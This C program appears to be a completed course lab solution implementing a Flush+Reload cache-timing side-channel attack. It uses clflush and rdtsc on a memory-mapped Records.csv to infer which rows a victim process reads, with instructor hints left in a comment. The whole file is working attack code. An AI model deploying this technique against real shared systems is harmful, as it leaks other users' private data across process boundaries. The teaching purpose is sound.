#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <x86intrin.h>
#define HIT_TIME 15
#define CSV_ITEM_NUM 84

/* Lengths of each row in the CSV file. */
int csv_offsets[] = {
    126, 88, 98, 101, 89,  100, 93,  84, 98,  88,  110, 91, 101, 92,  91,
    90,  88, 98, 87,  94,  88,  96,  95, 97,  90,  92,  97, 88,  101, 96,
    90,  90, 89, 93,  92,  99,  95,  89, 82,  95,  95,  88, 96,  96,  95,
    102, 95, 99, 96,  95,  89,  103, 90, 97,  102, 88,  87, 89,  90,  90,
    97,  88, 86, 96,  92,  91,  105, 89, 95,  101, 97,  96, 100, 93,  91,
    88,  85, 90, 101, 107, 91,  90,  91, 111, 100};

// Return the size of a file
long file_size(const char *filename) {
  struct stat s;
  if (stat(filename, &s) != 0) {
    printf("Error reading file stats !\n");
    return 1;
  }
  printf("File size = %lu\n", s.st_size);
  return s.st_size;
}

/* Performs a dummy access
   to the address specified. */
void maccess(void *addr) {
  asm volatile("movq (%0), %%rax\n" : : "c"(addr) : "rax");
}

/* Flushes the cache block corresponding
   to the address from the entire cache
   hierarchy. */
void flush(void *addr) {
  asm volatile("clflush 0(%0)\n" : : "c"(addr) : "rax");
}

/* Reads the Time Stamp Counter. */
uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile("mfence");
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

/* combines rdtsc and maccess */
uint64_t measure_one_block_access_time(void *addr) {
  uint64_t cycles;

  asm volatile("mov %1, %%r8\n\t"
               "lfence\n\t"
               "rdtsc\n\t"
               "mov %%eax, %%edi\n\t"
               "mov (%%r8), %%r8\n\t"
               "lfence\n\t"
               "rdtsc\n\t"
               "sub %%edi, %%eax\n\t"
               : "=a"(cycles) /*output*/
               : "r"(addr)
               : "r8", "edi");

  return cycles;
}

int main(int argc, char *argv[]) {
  int a[64] = {0};
  unsigned long hit_time, miss_time;

  if (argc != 2) {
    printf("Usage: attack hit_time,miss_time\n");
    return 1;
  }

  hit_time = atoi(strtok(argv[1], ","));
  miss_time = atoi(strtok(NULL, ","));
  if (hit_time < 0 || miss_time < 0) {
    printf("Error: Invalid hit/miss time\n");
    return 1;
  }

  char *filename = "Records.csv";
  int fd = open(filename, O_RDONLY);
  unsigned char *addr = (unsigned char *)mmap(0, file_size(filename), PROT_READ,
                                              MAP_SHARED, fd, 0);
  if (addr == (void *)-1 || addr == (void *)0) {
    printf("error: failed to mmap\n");
    return 1;
  }
  int scan_idx = 0, row_idx = 0;
  uint64_t time;
  unsigned char *offset_addrs[CSV_ITEM_NUM];
  uint64_t tmp_offset = 0;
  int check_flag[CSV_ITEM_NUM];
  int hit_count[CSV_ITEM_NUM];
  int cur_hit_max = 0;
  int cur_hit_max_idx = -1;
  int check_count = 0;
  for (int i = 0; i < CSV_ITEM_NUM; i++) {
    tmp_offset += csv_offsets[i];
    offset_addrs[i] = addr + tmp_offset;
    check_flag[i] = 0;
    hit_count[i] = 0;
  }
  while (1) {
    scan_idx++;
    row_idx = (scan_idx * 10037 + 2333) % CSV_ITEM_NUM;
    if (row_idx < 0) {
      row_idx += CSV_ITEM_NUM;
    }
    if (check_flag[row_idx] == HIT_TIME) {
      continue;
    }

    check_flag[row_idx] += 1;
    check_count += 1;

    flush(offset_addrs[row_idx]);
    for(int i=0;i<15;i++)
    sched_yield();
    time = measure_one_block_access_time(offset_addrs[row_idx]);
    if (time <= hit_time + 20) {
      //printf("hit %d\t%d\n", row_idx, hit_count[row_idx]);
      hit_count[row_idx] += 1;
    }
    if (hit_count[row_idx] > cur_hit_max) {
      cur_hit_max = hit_count[row_idx];
      cur_hit_max_idx = row_idx;
    }
    if (check_count == HIT_TIME * CSV_ITEM_NUM) {
      if (cur_hit_max_idx > 0 & cur_hit_max>=3) {
        printf("%d\t%d\n", cur_hit_max_idx + 1, cur_hit_max);
      }
      for (int i = 0; i < CSV_ITEM_NUM; i++) {
        check_flag[i] = 0;
        hit_count[i] = 0;
      }
      check_count = 0;
      cur_hit_max_idx = -1;
      cur_hit_max = 0;
    }
    // printf("%d\n", time);
  }
  /* Insert your code here. Things to keep in mind:
     1. Do not scan the cache sets sequentially.
        Use a function such as (index*prime + offset)%(maxrange).
        This is to overcome prefetching.
     2. Use sched_yield() while waiting for victim to access.
     3. Use hit_time and/or miss_time to detect hits and misses.
     4. Monitor the same cache set N times before monitoring the
        next set. (Clue: N~10 should work)
  */

  return 0;
}
